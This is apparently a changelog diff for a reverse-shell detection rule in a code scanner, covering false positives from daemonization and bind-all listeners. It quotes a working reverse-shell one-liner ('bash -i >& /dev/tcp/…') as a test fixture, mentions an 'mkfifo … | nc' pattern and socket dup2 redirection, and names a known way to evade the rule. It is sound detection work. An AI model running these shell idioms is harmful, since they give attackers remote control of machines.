@@ -1066,6 +1066,50 @@ The code had drifted behind its own spec, and four issue-#105 shapes were invisi
 - **Fixtures:** `TestReverseShellIdiomsCovered` in `pkg/rules/rules_test.go` (10 TP families + 6 FP
   near-misses). TP: `bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`. FP: `app.listen(3000, '127.0.0.1')`.
 
+#### Polish, cycle 139 — daemonization is not a reverse shell, and a corpus without attacks cannot count true positives (#302)
+
+**What the sweep found.** The 2026-09-15 skillsmp sweep gave the rule 7 hits, all false: 3 ×
+`os.dup2(<file>.fileno(), …)` in a dev-server launcher, 4 × `.bind(("0.0.0.0", port))` in a router
+and a port check. Read together with the pinned corpus's 6 (all `clawhub/prompt-guard`'s own
+denylist), that is 13 findings over 1,148 bundles with nothing true in them.
+
+**Fixed: the `dup2` leaf.** `os.dup2(<fd>.fileno(), 1)` is **daemonization** when the fd is a log
+file or `/dev/null`, and a reverse shell only when it is a **socket**. Both dup onto stdio, so the
+leaf cannot distinguish them — but the benign fd source sits on the **same line**, which is exactly
+what a line-scoped `suppress` can see. Carved out `log*`, `devnull`, `null`, `out*`, `err*`,
+`stdout/stderr/stdin`, `sys.std*`, `f`/`fp`/`fh`. `os.dup2(s.fileno(), 1)` and
+`os.dup2(conn.fileno(), 2)` still fire.
+*Known residual, accepted:* an attacker who names their socket `log` escapes this leaf. The
+alternative — requiring a socket token anywhere in the file — would still fire on any server that
+both opens a socket and daemonizes, which is most of them.
+
+**Not fixed, and the reason corrects this cycle's own first reading.** The bind-all leaf was removed
+in a first draft on the strength of "4 hits, 4 benign, and zero true positives across two corpora".
+That reasoning was wrong, and two existing tests caught it: `testdata/malicious/setup.sh` carries a
+**deliberate `::` bind-all listener**, pinned by `TestMaliciousFixtureTriggersIPv6BindAll` and six
+rows in `TestReverseShellIdiomsCovered`, added by the cycle-94 repair below. **The evaluation corpus
+contains no malicious skills by construction, so "zero true positives there" is the expected result
+for essentially any AST01 rule and is not evidence that a leaf is worthless.** The fixture is the
+true positive.
+
+The real problem is narrower and is a *severity* question, not a pattern one: a benign server and a
+hostile listener spell bind-all **identically**, so no regex can separate them. Filed to
+`docs/planned-rules.md` — the plausible answer is its own id at `medium` with AST06 emphasis, which
+would report the exposure without failing a bundle whose job is to run a service.
+
+**Left alone on purpose: the detector-catalog class.** All 6 pinned hits are `prompt-guard`
+cataloguing what it blocks, including a `mkfifo … | nc` **regex literal** in `patterns.py`. Those
+land on the 0.9–0.95 leaves, whose vocabulary is correct — a benign corpus is precisely where real
+reverse-shell strings appear *listed rather than used*. Triage's sequencing was to fix the weak
+leaves first and re-measure; the `nc -e` leaf was already narrowed once for this class (cycle 94,
+below), so the precedent exists when someone returns to it.
+
+**Corpus: 6 → 6, no delta on any other rule, no verdict changes.** The `dup2` leaf measures 0 on the
+pinned corpus before and after, so the regen proves the carve-out costs nothing but cannot prove its
+benefit — that evidence is the sweep's, and its samples are deleted by design. The five verbatim
+lines are pinned as `want:false` rows in `TestReverseShellNeedsTheIdiomUsedNotListed`
+(`pkg/rules/revshell_test.go`).
+
 #### Polish, cycle 94 — IPv6 bind-all was invisible, and every corpus hit was security tooling
 
 **Recall: the bind-all leaf only ever matched half of its own alternation.** It read
